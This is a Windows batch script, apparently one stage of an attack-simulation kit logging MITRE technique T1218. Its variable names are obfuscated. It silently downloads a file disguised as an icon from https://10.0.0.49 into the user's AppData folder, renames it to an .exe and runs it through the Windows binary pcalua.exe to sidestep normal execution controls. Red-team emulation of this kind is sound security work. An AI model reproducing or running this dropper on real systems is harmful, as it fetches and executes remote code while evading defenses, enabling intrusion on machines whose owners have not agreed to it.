@echo off
setlocal enabledelayedexpansion

SET sdnfklj=%APPDATA%\10492\abea3b93
SET wevbnmz=28f37f83.txt
SET xpogijh=https://10.0.0.49/stage/2/icon.png?10492-7
SET yrmnkql=BALAM-S2B
SET athszuc=10492
SET czekdpb=7

SET logfile=%APPDATA%\!czekdpb!\macula-simulations.log
mkdir "%APPDATA%\!czekdpb!" 2>nul

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!sdnfklj!\!wevbnmz!" "!xpogijh!" >nul 2>&1
echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: heartbeat_complete>> "!logfile!" 2>nul

echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: chdir_start>> "!logfile!" 2>nul
cd /d "!sdnfklj!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: chdir_result=1>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: chdir_result=0>> "!logfile!" 2>nul
)

rename "!wevbnmz!" "!wevbnmz!.exe" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: rename_result=1>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: rename_result=0>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: pcalua_start>> "!logfile!" 2>nul
pcalua.exe -a "!wevbnmz!.exe" >nul 2>&1
echo [!tsvar!][DEBUG][!yrmnkql!][!athszuc!]: pcalua_complete>> "!logfile!" 2>nul

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set datetime=!datetime:~0,14!
set "log_ts=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!"

if exist "!wevbnmz!.exe" (
    echo [!log_ts!][TTP][!yrmnkql!][!athszuc!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logfile!"
) else (
    echo [!log_ts!][TTP][!yrmnkql!][!athszuc!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!logfile!"
)

endlocal